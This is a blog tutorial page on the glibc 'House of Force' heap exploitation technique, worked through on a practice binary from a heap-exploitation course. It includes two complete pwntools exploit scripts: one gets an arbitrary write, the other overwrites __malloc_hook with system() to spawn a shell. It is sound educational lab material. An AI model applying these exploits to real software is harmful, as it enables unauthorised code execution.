
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex" />

  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
    href="https://ojack69.github.io/jacks-corner/theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
          href="https://ojack69.github.io/jacks-corner/theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light)"
          href="https://ojack69.github.io/jacks-corner/theme/pygments/emacs.min.css">


  <link rel="stylesheet"
        type="text/css"
        href="https://ojack69.github.io/jacks-corner/theme/stork/stork.css" />

  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/solid.css">

        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/custom.css"> 
        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/zoom.css"> 
        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/collapsible-toc.css"> 
        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/goals.css"> 


      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/collapsible-toc.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/zoom.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/app.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/goals.js" type="application/javascript"></script>











 

<meta name="author" content="Jack69" />
<meta name="description" content="GLIBC Version Checking The house of force is an older exploitation technique that works on glibc 2.27 and lower. To get the correct version of glibc it is possible to run the libc file itself since it is an ELF shared object binary. ldd $(which id)     linux-vdso.so.1 …" />
<meta name="keywords" content="">


  <meta property="og:site_name" content="Jack's Corner"/>
  <meta property="og:title" content="Heap Journey - House of Force"/>
  <meta property="og:description" content="GLIBC Version Checking The house of force is an older exploitation technique that works on glibc 2.27 and lower. To get the correct version of glibc it is possible to run the libc file itself since it is an ELF shared object binary. ldd $(which id)     linux-vdso.so.1 …"/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="https://ojack69.github.io/jacks-corner/binary-exploitation/heap-journey/house-of-force.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2023-08-25 18:00:00+02:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="https://ojack69.github.io/jacks-corner/author/jack69.html">
  <meta property="article:section" content="Binary Exploitation"/>
  <meta property="og:image" content="">

  <title>Jack's Corner &ndash; Heap Journey - House of Force</title>


</head>
<body >

<aside>
  <div>
    <a href="https://ojack69.github.io/jacks-corner/">
      <img src="https://ojack69.github.io/jacks-corner/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
    </a>

    <h1>
      <a href="https://ojack69.github.io/jacks-corner/">Jack's Corner</a>
    </h1>


    <div class="stork">
        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
      <div class="stork-output" data-stork="sitesearch-output"></div>
    </div>


    <ul class="social">
      <li>
        <a class="sc-htb"
           href="https://app.hackthebox.com/profile/177323"
           target="_blank">
          <i class="fa-brands fa-htb"></i>
        </a>
      </li>
      <li>
        <a class="sc-thm"
           href="https://tryhackme.com/p/jack69"
           target="_blank">
          <i class="fa-brands fa-thm"></i>
        </a>
      </li>
    </ul>
  </div>
</aside>
  <main>

<nav>
  <a href="https://ojack69.github.io/jacks-corner/">Home</a>

  <a href="https://ojack69.github.io/jacks-corner/categories.html">Categories</a>
  <a href="https://ojack69.github.io/jacks-corner/category/cheatsheet.html">Cheatsheets</a>
  <a href="https://ojack69.github.io/jacks-corner/personal/goals.html">Goals</a>


</nav>

<article class="single">
  <header>
      
    <h1 id="binary-exploitation/heap-journey/house-of-force">Heap Journey - House of Force</h1>
    <p>

    </p>
  </header>


  <div>
        <div class="toc col-lg-3 hidden-xs hidden-sm">
            <div id="toc"><ul><li><a class="toc-href" href="#glibc-version-checking" title="GLIBC Version Checking">GLIBC Version Checking</a></li><li><a class="toc-href" href="#house-of-force-concept" title="House of Force Concept">House of Force Concept</a></li><li><a class="toc-href" href="#example-arbitrary-write" title="Example: Arbitrary Write">Example: Arbitrary Write</a></li><li><a class="toc-href" href="#example-command-execution" title="Example: Command Execution">Example: Command Execution</a></li></ul></div>
        </div>
    <h2 id="glibc-version-checking">GLIBC Version Checking</h2>
<p>The house of force is an older exploitation technique that works on glibc 2.27 and lower.
To get the correct version of glibc it is possible to run the libc file itself since it is an ELF shared object binary.</p>
<blockquote>
<p><strong>ldd $(which id)</strong><br/>
&nbsp;&nbsp;&nbsp;&nbsp;linux-vdso.so.1 (0x00007ffd55369000)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;libc.so.6 =&gt; /usr/lib/libc.so.6 (0x00007f36b1200000)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;<strong>/lib64/ld-linux-x86-64.so.2</strong> =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f36b155e000)  </p>
<p><strong>file /lib64/ld-linux-x86-64.so.2</strong><br/>
/lib64/ld-linux-x86-64.so.2: <strong>ELF 64-bit LSB shared object</strong>, x86-64, version 1 (GNU/Linux), static-pie linked, BuildID[sha1]=47da73e90a3ede988e228212d8247a94f9da36a0, stripped</p>
<p><strong>/lib64/ld-linux-x86-64.so.2 --version</strong><br/>
ld.so (GNU libc) stable release version <strong>2.38</strong><br/>
...</p>
</blockquote>
<p>libc.so.6 is generally a symlink to a specific version of libc:  </p>
<ul>
<li>in stable distros libc version doesn't often change</li>
<li>in rolling distros it is often updated</li>
</ul>
<h2 id="house-of-force-concept">House of Force Concept</h2>
<p>The basic concept is to use malloc internals against itself:</p>
<ul>
<li>The <strong>'House of Force'</strong> exploits the 'top chunk' by overflowing into the top chunk's "size" header.<br/>
The goal is to set a very large size (0xFFFFFFFFFFFFFFFF or -1) so that the top chunk wraps all the virtual address space. This could lead to arbitrary writes
in memory or code execution when heap chunk's or libc addresses are leaked.<ul>
<li><em>Note</em>: Sometimes 0xFFFFFFFFFFFFFFFF can break things. In that case, try a smaller number (eg: 0xFFFFFFFFFFFFFFF1).</li>
</ul>
</li>
</ul>
<p>Many GLIBC implementation do not check top chunk size integrity:</p>
<ul>
<li>Check if any mitigation is implemented for the currently used libc version.</li>
<li>Since libc version depends on the system running the binary (unless libc.so path is explicitly set), the same binary can be vulnerable on some system rather than others .</li>
</ul>
<p><br/></p>
<p><img alt="memory layout" src="/images/binary-exploitation/heap-journey/house-of-force/heap-1.png"/></p>
<h2 id="example-arbitrary-write">Example: Arbitrary Write</h2>
<p>From Udemy course "Linux Heap Exploitation - Part 1", the binary <em>house_of_force</em> is vulnerable to this heap exploitation technique.</p>
<p>The aim is to perform a write in memory so that the content of memory addressed by the "target" symbol is set to an arbitrary string.</p>
<p>The binary leaks the heap top chunk address ("heap @") and the puts libc function address ("puts() @"). Moreover, it allows to allocate an arbitrary sized chunk into the heap without checking the input length.<br/>
This permits overflowing the top chunk header, overriding the chunk size.</p>
<blockquote>
<p>=============== |   HeapLAB   |  House of Force ===============<br/>
puts() @ 0x7f117f66df10<br/>
heap @ 0x252f000<br/>
<br/>
1) malloc 0/4<br/>
2) target<br/>
3) quit</p>
</blockquote>
<p>The initial content of the target is</p>
<blockquote>
<p>&gt; 2<br/>
target: XXXXXXXX</p>
</blockquote>
<p>By allocating a chunk of 24 bytes with the input A * 24 + B * 8, the top chunk header gets overridden:</p>
<blockquote>
<p>&gt; 1<br/>
size: 24<br/>
data: AAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB</p>
<p>gef➤  heap chunks<br/>
<br/>
Chunk(addr=0x603010, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603010     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA]<br/>
<br/>
Chunk(addr=0x603030, size=<strong>0x4242424242424240</strong>, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  &larr;  <strong>top chunk</strong></p>
</blockquote>
<p>It means that we can perform the "house of force" attack. The first step is that of setting the top chunks size to a very large number (*see the pwntools code at the end):   </p>
<p><code>malloc(b"24",b"A"*24 + p64(0xfffffffffffffff1))</code></p>
<p>The second step is that of calculating the gap between the top chunk and the "target" symbol. The goal is to span this gap by allocating an useless chunk of a particular size so that the next allocated chunk will be wrote into target memory by the malloc implementation of glibc.
This gap is calulated as <strong>the distance between the target symbol address and the top chunk address</strong>.  </p>
<blockquote>
<p>target @ - header_offset - heap @ - ( last-chunk @  - heap @ ) </p>
</blockquote>
<p>When calculating this value is important to take in account that malloc will also allocate an header of size 0x10 with the final chunk, as well as the already allocated chunks, by subtracting to the gap <strong>the distance of the last chunk to the top chunk</strong> and the <strong>size of a chunk header (doubled)</strong>.</p>
<p><code>other_heap_allocations = 0x20</code> </p>
<p><code>header_offset = 0x10 * 2</code></p>
<p><code>distance = (elf.sym.target - header_offset - top_chunk_addr_leak - other_heap_allocations)</code></p>
<p>Allocating a junk chunk with the size of the gap will make the dynamic memory allocator write the next malloc into target memory since it is the next address considerated to be "free" to allocate. This is possibile due the big size set to the top chunk that deceives the allocator.</p>
<p><code>malloc(f"{distance}".encode(), b"JUNK")</code></p>
<p>The last step is to allocate a chunk which content will override the target:</p>
<p><code>malloc(b"24",b"PWNED"+b"\x00\x00\x00")</code></p>
<blockquote>
<p>&gt; 2<br/>
target: PWNED  </p>
</blockquote>
<p>The complete pwntools solution is the following:</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./house_of_force"</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">"./house_of_force"</span><span class="p">)</span>
<span class="c1">#p = process("./house_of_force")</span>

<span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span>
    <span class="sa">b</span><span class="s2">"send size"</span> <span class="o">+</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"size: "</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
    <span class="sa">b</span><span class="s2">"send data:"</span> <span class="o">+</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="sa">b</span><span class="s2">"receive prompt"</span> <span class="o">+</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"heap @ "</span><span class="p">)</span>
<span class="n">top_chunk_addr_leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>


<span class="c1"># Malloc first chunk to overflow into top chunk header</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">b</span><span class="s2">"24"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"A"</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfffffffffffffff1</span><span class="p">))</span>

<span class="c1"># malloc(b"24",b"B"*10) # Useless heap allocation - check other_heap_allocations variable</span>

<span class="c1"># Calculate distance between heap top chunk address and "target" symbol</span>

<span class="c1"># Distance between the last chunk and the top chunk</span>
<span class="c1">#other_heap_allocations = 0x60 # example: it depends on how many heap allocation had place</span>
<span class="n">other_heap_allocations</span> <span class="o">=</span> <span class="mh">0x20</span>

<span class="c1"># This offset is the size of the chunk header (0x10) doubled to make the allocator span the gap just before where the final chunk header will be written.</span>
<span class="c1"># If it was equal to 0x10, the chunk header would be written into the target memory and not just before</span>
<span class="n">header_offset</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">*</span> <span class="mi">2</span>

<span class="n">distance</span> <span class="o">=</span> <span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">target</span> <span class="o">-</span> <span class="n">header_offset</span> <span class="o">-</span> <span class="n">top_chunk_addr_leak</span> <span class="o">-</span> <span class="n">other_heap_allocations</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Top chunk: 0x</span><span class="si">{</span><span class="n">top_chunk_addr_leak</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Target symbol: 0x</span><span class="si">{</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">target</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Distance: 0x</span><span class="si">{</span><span class="n">distance</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Distance: </span><span class="si">{</span><span class="n">distance</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>

<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">distance</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s2">"JUNK"</span><span class="p">)</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">b</span><span class="s2">"24"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"PWNED"</span><span class="o">+</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00\x00\x00</span><span class="s2">"</span><span class="p">)</span>


<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<h2 id="example-command-execution">Example: Command Execution</h2>
<p>When weaponizing the house of force techinique, some of common targets which can lead to code execution are:</p>
<ul>
<li><strong>PLT (procedure linking table)</strong>: array of function pointers external to the program, such as those offered by GLIBC. This array is writable at some point of the execution to allow the lazy linking, whereby a function's address is only resolved when it's first called. </li>
<li><strong>fini_array</strong>: array of function pointers; this functions are called when the program is exiting.</li>
</ul>
<p>Since the binary is compiled with <strong>RELRO</strong>, PLT and fini_array are marked as read-only after initialization.</p>
<blockquote>
<p><strong>checksec house_of_force</strong><br/>
[*] '/home/rick/Scrivania/Linux Heap Exploitation 1/HeapLAB/house_of_force/house_of_force'<br/>
&nbsp;&nbsp;&nbsp;&nbsp;Arch:     amd64-64-little<br/>
&nbsp;&nbsp;&nbsp;&nbsp;RELRO:    <strong>Full RELRO</strong><br/>
&nbsp;&nbsp;&nbsp;&nbsp;Stack:    Canary found<br/>
&nbsp;&nbsp;&nbsp;&nbsp;NX:       NX enabled<br/>
&nbsp;&nbsp;&nbsp;&nbsp;PIE:      No PIE (0x400000)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;RUNPATH:  b'../.glibc/glibc_2.28_no-tcache'  </p>
</blockquote>
<p><a href="https://ctf101.org/binary-exploitation/relocation-read-only/">Relocation Read-Only (or RELRO) is a security measure which makes some binary sections read-only.</a></p>
<p>If any <em>function pointer</em> is present in the heap or stack and used during the target binary execution, it could also be a valid target.</p>
<p>GLIBC has its own PLT alongside with two other structures called <strong>__exit_funcs</strong> and <strong>tls_dtors</strong> which are similar to the fini_array:</p>
<ul>
<li>even though the GLIBC PLT is writable, it can happen that no function in it are called by the program;</li>
<li>the __exit_funcs and tls_dtors are generally hard to abuse due to other protection mechanisms.</li>
</ul>
<p>Another possibility is represented by the <strong>malloc hooks</strong>; manipulating these it's possible to hijack the execution flow.</p>
<ul>
<li>Each malloc core function (malloc, free, etc.) is associated to an hook which is a writable pointer in the GLIBC data section.</li>
</ul>
<p>The libc <strong>system</strong> function permits to execute arbitrary shell commands; since the ASRL is enabled, the first step is to determine where in memory the libc functions are loaded.
Thank to the leaked puts address, it is possibile to find the libc position in memory by calculating the offset between the leaked puts address and the libc shared object puts symbol.</p>
<p><code>p.recvuntil(b"puts() @ ")</code><br/>
<code>libc_puts_addr_leak = int(p.recvline(), 16)</code><br/>
<code>libc_addr = libc_puts_addr_leak - libc.sym.puts</code></p>
<p>It's also possibile to get the symbol location into the libc ELF manually:</p>
<blockquote>
<p>objdump -d -M intel /usr/lib/libc.so.6 | grep -Eo "[a-e0-9]{16}\s&lt;\w*puts@@GLIBC"<br/>
<strong>0000000000078350</strong> &lt;_IO_fputs</p>
</blockquote>
<p>This time the distance will be calculated from the __malloc_hook symbol. Within the junk heap is written the "/bin/sh" string which will be used next when calling the system function to open a shell.  </p>
<p><code>distance = (libc.sym.__malloc_hook - header_offset - top_chunk_addr_leak - other_heap_allocations)</code>
<code>malloc(f"{distance}".encode(), b"/bin/sh\0")</code></p>
<p>This will make the next malloc call write into __malloc_hook memory space. The goal is to assign to the __malloc_hook the address of the <em>system</em> symbol:</p>
<p><code>malloc(b"24", p64(libc.sym.system))</code></p>
<p>The next malloc call will trigger the __malloc_hook which is now equal to the system function address. The malloc size parameter will be passed to the system function so this time the "/bin/sh" string address will be passed to the malloc function as size parameter to make the system function open the shell.</p>
<p><code>malloc(f"{shell_string_addr}".encode(), b"")</code></p>
<p>An alternative is that of search for the "/bin/sh" string into the libc share object itself since it is surely contained in it.</p>
<p><code>malloc(next(libc.search(b"/bin/sh")), b"")</code></p>
<p>The complete pwntools solution is the following:</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./house_of_force"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">runpath</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"/libc.so.6"</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">"./house_of_force"</span><span class="p">)</span>
<span class="c1">#p = process("./house_of_force")</span>

<span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"size: "</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"puts() @ "</span><span class="p">)</span>
<span class="n">libc_puts_addr_leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"heap @ "</span><span class="p">)</span>
<span class="n">top_chunk_addr_leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>

<span class="c1"># Find the memory address where libc is loaded by calculating the offset between leaked puts address and libc puts symbol in the shared object</span>
<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">libc_puts_addr_leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">puts</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_addr</span>

<span class="c1"># Malloc first chunk to overflow into top chunk header</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">b</span><span class="s2">"24"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"A"</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfffffffffffffff1</span><span class="p">))</span>

<span class="c1"># Distance between the last chunk and the top chunk</span>
<span class="n">other_heap_allocations</span> <span class="o">=</span> <span class="mh">0x20</span>

<span class="c1"># This offset is the size of the chunk header (0x10) doubled to make the allocator span the gap just before where the final chunk header will be written.</span>
<span class="c1"># If it was equal to 0x10, the chunk header would be written into the target memory and not just before</span>
<span class="n">header_offset</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">*</span> <span class="mi">2</span>

<span class="n">distance</span> <span class="o">=</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">__malloc_hook</span> <span class="o">-</span> <span class="n">header_offset</span> <span class="o">-</span> <span class="n">top_chunk_addr_leak</span> <span class="o">-</span> <span class="n">other_heap_allocations</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Top chunk: 0x</span><span class="si">{</span><span class="n">top_chunk_addr_leak</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Libc Address: 0x</span><span class="si">{</span><span class="n">libc_addr</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"__malloc_hook symbol: 0x</span><span class="si">{</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">__malloc_hook</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Distance: 0x</span><span class="si">{</span><span class="n">distance</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Distance: </span><span class="si">{</span><span class="n">distance</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>

<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">distance</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s2">"/bin/sh</span><span class="se">\0</span><span class="s2">"</span><span class="p">)</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">b</span><span class="s2">"24"</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">))</span>

<span class="n">shell_string_addr</span> <span class="o">=</span> <span class="n">top_chunk_addr_leak</span> <span class="o">+</span> <span class="mh">0x30</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Shell string addr: 0x</span><span class="si">{</span><span class="n">shell_string_addr</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mf">0.1</span> <span class="c1"># Set low timeout otherwise pwntools will wait for an output that will not arrive due the spawned shell</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">shell_string_addr</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s2">""</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
  </div>
  <div class="tag-cloud">
    <p>
    </p>
  </div>






</article>

<footer>
<p>&copy; Jack69 - 2026 </p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="https://ojack69.github.io/jacks-corner/theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="dark"
          type="text/javascript">
  </script>
</p></footer>  </main>

<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " Jack's Corner ",
  "url" : "https://ojack69.github.io/jacks-corner",
  "image": "",
  "description": "My personal notes on stuff I like, nothing special"
}
</script>  <script>
    window.loadStorkIndex = function () {
      stork.initialize("https://ojack69.github.io/jacks-corner/theme/stork/stork.wasm")
      stork.register("sitesearch", "https://ojack69.github.io/jacks-corner/search-index.st", { showProgress: false });
    }
  </script>
  <script src="https://ojack69.github.io/jacks-corner/theme/stork/stork.js"></script>

</body>
</html>